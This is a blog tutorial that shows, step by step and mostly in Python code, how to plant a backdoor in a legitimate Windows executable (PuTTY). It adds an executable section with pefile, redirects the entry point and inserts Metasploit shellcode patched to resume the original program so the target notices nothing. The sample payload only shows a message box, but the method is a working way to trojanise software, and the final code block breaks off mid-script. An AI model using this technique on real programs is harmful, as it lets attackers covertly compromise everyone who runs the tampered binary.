If you perform penetration testing as your daily job, it is often useful to inject backdoor into legit application. There are lots of tools out there that can perform those kind of tasks, but do you know how they really work ? In this post, I will show you a simple method to inject a backdoor into an executable.

Here we will use Python as it is a really versatile language and also one of the most used in offensive computing. I strongly suggest you read one of my previous [article](http://breakinsecurity.com/pe-format-manipulation-with-pefile/) about the Portable Executable format to fully understand this post.

## Introdcution

Here, the goal is to inject foreign code into an executable, but we still want the original executable to work (as we don't want to raise any suspiction from our target). Here is the global idea of how we will modify the application to inject our backdoor:

![image-center](/images/2017-12-29-code-injection-with-python/diff-backdoored.svg.xml.svg){: .align-center}

There are 2 main methods to inject code to an executable: 

* Add a section to the executable, but it will (slightly) increase the size of the executable.
* Add code into *empty* section (or code cave) of the executable, it won't increase the size but its easy to break the program depending on the method you use. Also, it lakes of versatility depending on the target executable (few or no code cave).

Here, we will use the first method as it is more easy and reliable, but if you want to try the second one you can check the following [link](http://www.darkridge.com/~jpr5/mirror/fravia.org/covert1.htm).

**Note:** Be careful, if you run an antivirus on your machine, modifying the structure of an executable could be interpreted as a viral attack and the AV will block or remove your executable. Now you know.

### Quick Reminder

Before adding a new section, we need to know the structure details to not break our executable. In a PE executable, the section is composed of 2 parts:

* The **section**, containing the executable code.
* The **section header**, containing the description of the section (address, code, size, etc.)

The section header length is 40 bytes and follow this structure:

```python
class SECTION_HEADER(Structure):
    _fields_ = [
        ("Name",                    BYTE * 8),
        ("VirtualSize",             DWORD),
        ("VirtualAddress",          DWORD),
        ("SizeOfRawData",           DWORD),
        ("PointerToRawData",        DWORD),
        ("PointerToRelocations",    DWORD),
        ("PointerToLinenumbers",    DWORD),
        ("NumberOfRelocations",     WORD),
        ("NumberOfLinenumbers",     WORD),
        ("Characteristics",         DWORD)
    ]
```

Each field help Windows to load the sections properly into the memory. Here, we are only interested by the following fields, the others will be initialized at zero.

* `Name`, contains the section name with a padding of null bytes if the size of the name is not equal to 8 bytes.
* `VirtualSize`, contains the size of the section in memory. 
* `VirtualAddress`, contains the relative virtaul address of the section. 
* `SizeOfRawData`, contains the size of the section on the disk.
* `PointerToRawData`, contains the offset of the section on the disk. 
* `Characteristics`, contains the flags describing the section characteristics (RWX).

**Note:** It's really important to differentiate VA (Virtual Address) and RVA (Relative Virtual Address). A relative virtual address is the virtual address of an object from the file once it is loaded into memory, minus the base address (often equal to `0x00400000`) of the file image. 
{: .notice--info}

Finally, we have to take care of the alignment. The value swe will set into the section header should be aligned to the value set into the `OPTIONAL_HEADER` of the PE file.

* `SectionAligment`, section alignment in memory. 
* `FileAligment`, section alignment on the disk. 

Not clear enough ? Let's say `FileAligment` equals 512 bytes and `SectionAligment` equals 4096 bytes. If you new section contains 515 bytes on the disk, the section size value on the disk (`SizeOfRawData`) will be 1024 because 515 > 512, so we round it up. Same thing for the `VirtualSize`, it will be equal to 4096 bytes, because 515 < 4096. Here is how to find the right values for you:

```bash
(((value_to_align + alignment - 1) / alignment) * alignment)

# Shellcode size = 12345 bytes
# FileAligment = 512 bytes
# SectionAligment = 4096 bytes

SizeOfRawData = (((12345 + 512 - 1) / 512) * 512)
VirtualSize = (((12345 + 4096 - 1) / 4096) * 4096)
```

In the follwing sections, I will describe the different steps I used to inject a backdoor into an executable. The full code will be available at the end of the tutorial.

### Create the Section Header

Now, we can start. We already can set 4 values in our header. I assume that our shellcode will be smaller than 4096 bytes.

```python
name            = ".axc"
virtual_size    = 0x1000 		# 4096 octets
raw_size        = 0x1000		# 4096 octets
characteristics = 0xE0000020 	# READ | WRITE | EXECUTE | CODE
```

For `VirtualAddress` and `PointerToRawData`, we have to be sure that we don't overwrite the other sections. If one of the pointer point to an existing header, we would corrupt the executable. To avoid this issue, we will set our pointers to go after the last section of the executable.

```python
import pefile

exe_path = "putty.exe"
pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1

virtual_offset = pe.sections[last_section].VirtualAddress + pe.sections[last_section].Misc_VirtualSize
raw_offset = pe.sections[last_section].PointerToRawData + pe.sections[last_section].SizeOfRawData
```

Now, the new section will be located right after the last section on the disk and in memory. To comply with the alignment, we will modify the code to dynamically compute the right values for the section size.

```python
import pefile

exe_path = "putty.exe"
pe = pefile.PE(exe_path)

number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment


# Quick function to align our values
def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment

raw_size = align(0x1000, pe.OPTIONAL_HEADER.FileAlignment)
virtual_size = align(0x1000, pe.OPTIONAL_HEADER.SectionAlignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   pe.OPTIONAL_HEADER.FileAlignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       pe.OPTIONAL_HEADER.SectionAlignment)
```

**Note:** For the tests I used **putty.exe**. [PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/) is a free implementation of SSH and Telnet for Windows, but you can use any executable.
{: .notice--info}

### Adding the Section Header

We have the right value for the new section header, but we didn't insert anything in the executable yet. Let's get the last section header address and add 40 bytes (size of the section header) to get an address to write our section.

```python
import pefile

exe_path = "putty.exe"
pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections

new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)
```

Easy, right ? Now we can write the new header properly, but we have to take care of 2 things: 

* We have to be careful and not break the current headers, it means that our value have to comply with the header format.
* We have to write them in little-endian (*pefile* will take care of that).

**Note:** On Intel-based plateform, the value are in little-endian. More info [here](http://en.wikipedia.org/wiki/Endianness).
{: .notice--info}

```python
import pefile

    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020 
    # Section name must be equal to 8 bytes
    name = ".axc" + (4 * '\x00')

    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
```

### Some Details

Our new section header have been added to the executable, but the loader can't see it yet. We nee to modify some value into the main structure header of the file first:

* `NumberOfSections`, in the `FILE_HEADER` must be increased by 1.
* `SizeOfImage`, in the `OPTIONAL_HEADER`, must be equal to the (VirtualAddress + VirtualSize (size of our new header)). 
* Enlage the size of the executable.

Concerning this last part, I remind you that we told to the executable that there is a new section of 4096 bytes somewhere, so we have to add some empty space to comply with the header information but also to add our shellcode. We only created the section header not the section itself.

```python
import pefile
import mmap
import os


def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment


def addSection(exe_path):
    # Init variables
    original_size = os.path.getsize(exe_path)
    pe = pefile.PE(exe_path)

    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

    # Look for valid values for the new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData +
                        pe.sections[last_section].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[last_section].VirtualAddress +
                            pe.sections[last_section].Misc_VirtualSize),
                           section_alignment)
    
    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020 
    # Section name must be equal to 8 bytes
    name = ".axc" + (4 * '\x00')

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    # Edit the value in the File and Optional headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    pe.write(exe_path)

    # Resize the executable
    # Note: I added some more space to avoid error
    fd = open(exe_path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x2000)
    map.close()
    fd.close()

exe_path = "putty.exe"
addSection(exe_path)
```

If we check the result in a random debugger, we should see the new section. At this point, *putty* should run perfectly as we properly added a section header.

### Edit the Entry Point

We are good for the section header structure. Now we will edit the entry point of the executable to execute our backdoor before the rest of the code (application).

```python
import pefile

exe_path = "putty.exe"
pe = pefile.PE(exe_path)

number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
new_ep = pe.sections[last_section].VirtualAddress
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint

print "[*] Original EntryPoint = 0x%08x" % oep
print "[*] New EntryPoint = 0x%08x" % new_ep

# Edit the EP to point to the shellcode
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
# Write to a new executable
pe.write("putty_mod.exe")
```

**Output**

```bash
[*] Original EntryPoint = 0x000550f0
[*] New EntryPoint = 0x00084000
```

Write the original entry point somewhere as we will use it later to redirect the execution flow to the original application.

### Injecting the Code

The last step is to inject our shellcode in the new section. I generated a simple shellcode with [Metasploit](http://metasploit.com), it will display a message box before starting the application. 

```python
# msfvenom -a x86 --platform windows -p windows/messagebox \
# TEXT="Hello, I'm in ur code" ICON=INFORMATION EXITFUNC=process \
# TITLE="BreakInSecurity" -f python

# No encoder or badchars specified, outputting raw payload
# Payload size: 283 bytes
# Final size of python file: 1362 bytes
shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                  b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                  b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                  b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                  b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                  b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                  b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                  b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                  b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                  b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                  b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                  b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                  b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                  b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                  b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                  b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                  b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                  b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
                  b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
                  b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
                  b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                  b"\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08")
```

Before injecting this shellcode, we need to modify it to redirect the execution flow to the application. As-is, this shellcode will close the application after being run. To redirect the execution flow we have to modify the last 6 bytes of the shellcode and tell it to continue the execution of the application.

```python
# Last 6 bytes of the original shellcode
# 31C0             XOR EAX,EAX
# 50               PUSH EAX
# FF55 08          CALL DWORD PTR SS:[EBP+8] 	// ExitProcess

# Replace the ExitProcess() by a Push/Call to start the main application
# B8 F0504500    MOV EAX, 004550f0
# FFD0           CALL EAX

# New bytes => \xB8\xF0\x50\x45\x00\xFF\xD0
```

To not break the application flow, replace the last bytes of the shellcode from `\x31\xc0\x50\xff\x55\x08` to `\xB8\xF0\x50\x45\x00\xFF\xD0`.

You should be asking why our original entry point (`0x000550f0`) is different from the one we use in our shellcode (`0x004550f0`). That's because once loaded in memory, the loader add the image base (`0x00400000`), contained in the `OPTIONAL_HEADER` to the entry point. If we don't add the image base, we will redirect the execution flow to an incorrect address and break the application.

Here is the result after the modification of the shellcode:

```python
import pefile

exe_path = "putty_mod.exe"
pe = pefile.PE(exe_path)

number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
raw_offset = pe.sections[last_section].PointerToRawData

## Conclusion

That's all for now. As you can see, we can do really interesting things with Python, even inject code into executable. Of course, this example is not really stable nor dynamic, but it gives you a good grasp on how backdoors are injected into executables.
